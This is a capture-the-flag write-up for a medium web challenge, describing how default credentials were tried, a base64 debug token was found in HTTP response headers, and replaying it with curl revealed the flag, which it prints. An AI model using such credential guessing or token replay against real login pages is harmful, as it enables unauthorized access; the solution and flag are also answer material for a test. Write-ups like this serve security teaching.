# Web: Flag Hunter

**Category:** Web Exploitation  
**Points:** 200  
**Difficulty:** Medium  
**Tools:** Burp Suite, curl, Browser DevTools

---

## Challenge Description

> "The admin forgot something important in the response. Can you find what they left behind?"

A URL to a login page was provided.

---

## Approach

### Step 1: Initial Reconnaissance

Opened the URL in the browser. Saw a standard login form. Tried default credentials (`admin:admin`, `admin:password`): all rejected with a generic "Invalid credentials" message.

### Step 2: Inspect Network Traffic

Opened DevTools → Network tab → captured the login POST request. The response body showed just `{"status": "error"}`.

But something caught my eye: the **response headers** had an unusual entry:

```
HTTP/1.1 401 Unauthorized
Content-Type: application/json
X-Debug-Token: dGVzdF9mbGFn
X-Powered-By: PHP/8.1
```

`X-Debug-Token` looked base64-encoded.

### Step 3: Decode the Header

```bash
echo "dGVzdF9mbGFn" | base64 -d
# Output: test_flag
```

Not quite the flag, but confirmed the header was being used. Tried sending the header back in the request:

```bash
curl -X POST http://challenge-url/login \
  -H "X-Debug-Token: dGVzdF9mbGFn" \
  -d "username=admin&password=test"
```

Response:
```json
{"status": "debug_mode", "flag": "CTF{h1dd3n_in_h3ad3rs}"}
```

---

## Flag

```
CTF{h1dd3n_in_h3ad3rs}
```

---

## Key Takeaway

**Always inspect HTTP response headers.** Many developers leave debug tokens, internal identifiers, or accidentally exposed data in custom headers (`X-*`). This is a common misconfiguration in production systems too.

---

## Tools Used

```bash
# Intercept with curl
curl -v http://challenge-url/login -d "username=admin&password=test"

# Decode base64
echo "dGVzdF9mbGFn" | base64 -d

# Or use Python
python3 -c "import base64; print(base64.b64decode('dGVzdF9mbGFn').decode())"
```
